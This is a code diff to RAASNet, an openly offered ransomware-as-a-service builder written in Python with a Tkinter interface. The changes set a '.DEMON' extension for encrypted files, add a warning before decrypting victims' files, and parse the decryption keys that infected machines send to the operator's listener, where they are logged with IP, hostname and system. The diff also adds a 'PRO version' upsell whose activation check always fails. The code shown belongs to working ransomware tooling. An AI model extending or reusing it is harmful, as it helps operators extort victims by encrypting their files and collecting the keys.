@@ -77,10 +77,7 @@ def resource_path(relative_path):
 def dec_key():
     key = password(text='Please enter your decryption key', title='Enter Key', mask ='*')
     if key == None or key == '':
-        messagebox.showwarning('Error', 'Please, enter your key.')
-        return False
-    if not len(key) == 32:
-        messagebox.showwarning('Invalid Key', 'Key should be 32 characters long')
+        messagebox.showwarning('Error', 'No key given. Canceled...')
         return False
     return key
 
@@ -111,7 +108,7 @@ def decrypt_file(file_name, key):
 class MainWindow(Tk):
     def __init__(self):
         Tk.__init__(self)
-        self.title(string = "RAASNet v0.1 (Public Test)") # Set window title
+        self.title(string = "RAASNet v%s" % __version__) # Set window title
         self.resizable(0,0) # Do not allow to be resized
         self.ttkStyle = ThemedStyle()
         self.ttkStyle.set_theme("arc")
@@ -127,7 +124,7 @@ class MainWindow(Tk):
         # Help dropdown
         help = Menu(menu, tearoff=0)
         help.add_command(label="View License", command=self.view_license)
-        help.add_command(label="Activate License", command=self.exit)
+        help.add_command(label="Upgrade to PRO version", command=self.upgrade)
         help.add_command(label="Visit Project on GitHub", command=self.open_github)
         menu.add_cascade(label="Help", menu=help)
 
@@ -153,10 +150,11 @@ class MainWindow(Tk):
             'new_msg' : StringVar(),
             'img_base64' : StringVar(),
             'debug' : IntVar(),
+            'ext' : StringVar(),
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -170,6 +168,7 @@ class MainWindow(Tk):
         self.options['demo'].set(0)
         self.options['ghost'].set(0)
         self.options['debug'].set(0)
+        self.options['ext'].set('.DEMON')
 
         self.options['msg'].set('''Tango Down!
 
@@ -604,6 +603,11 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         if p == False:
             return
 
+        a = messagebox.askokcancel('WARNING', 'This tool will decrypt your files with the given key.\n\nHowever, if your key is not correct, your files will return corrupted.\n\n You might want to make a backup!')
+        if a == True:
+            pass
+        else:
+            return
 
         try:
             counter = 0
@@ -611,7 +615,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 for name in files:
                     if name.endswith(".DEMON"):
                         decrypt_file(os.path.join(path, name), key)
-                        print("[Decrypting] %s" % name)
+                        print("[Decrypted] %s" % name)
                         counter+=1
                         os.remove(os.path.join(path, name))
                     else:
@@ -664,7 +668,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                                 ip = addr[0]
                                 local = data.split('$')[0]
                                 system = data.split('$')[1]
-                                key = data.split('$')[2]
+                                key = data.split('$')[2].strip()[2:].strip()[:-1]
 
                                 self.serv.options['log'].insert(END, '\n[%s %s] %s %s %s %s' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), ip.ljust(20), local.ljust(20), system.ljust(20), key), 'yellow')
                                 self.serv.options['log'].see(END)
@@ -672,7 +676,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                             else:
                                 if sock in socket_list:
                                     socket_list.remove(sock)
-                        except:
+                        except Exception as e:
+                            print(e)
                             continue
         except KeyboardInterrupt:
             print('Closed...\n')
@@ -730,11 +735,63 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
     def open_github(self):
         webbrowser.open_new_tab('https://www.github.com/leonv024/RAASNet')
 
+    def open_buy(self):
+        webbrowser.open_new_tab('https://www.zeznzo.nl/')
+
     def exit(self):
         sys.exit(0)
 
     def exit_event(self, event):
         exit(0)
+
+    def upgrade(self):
+        pro = '''
+                        UNLOCK PRO FEATURES
+                                FOR BETTER PENTESTING
+,_._._._._._._._._|__________________________________________________________,
+|_|_|_|_|_|_|_|_|_|_________________________________________________________/
+                  !
+
+                                PRO Features:
+                                    + ...
+                                    + ...
+                                    + ...
+                                    + ...
+                                    + ...
+                                    + ...
+                                    + ...
+                                    + ...
+                                    + ...
+
+,_._._._._._._._._|__________________________________________________________,
+|_|_|_|_|_|_|_|_|_|_________________________________________________________/
+                  !
+'''
+
+        self.pro = Toplevel()
+        self.pro.title(string = 'Upgrade to PRO version')
+        self.pro.configure(background = 'white')
+        self.pro.resizable(0,0)
+
+        box = Text(self.pro, height = 25, width = 100)
+        box.grid(row = 0, column = 0, columnspan = 2)
+        buy = Button(self.pro, text = 'BUY PRODUCT KEY', command = self.open_buy, width = 25).grid(row = 1, column = 0)
+        activate = Button(self.pro, text = 'ACTIVATE', command = self.activate, width = 25).grid(row = 1, column = 1)
+
+        box.insert('1.0', pro)
+
+    def activate(self):
+        key = password(text='Please enter your activation key', title='Enter Key')
+        if key == None:
+            messagebox.showwarning('Error', 'No key given. Canceled...')
+            return False
+
+        self.check_activation(key)
+
+    def check_activation(self, key):
+        messagebox.showerror('Failed to upgrade', 'Invalid key')
+        self.pro.destroy()
+
 
     def show_license(self):
         self.withdraw()
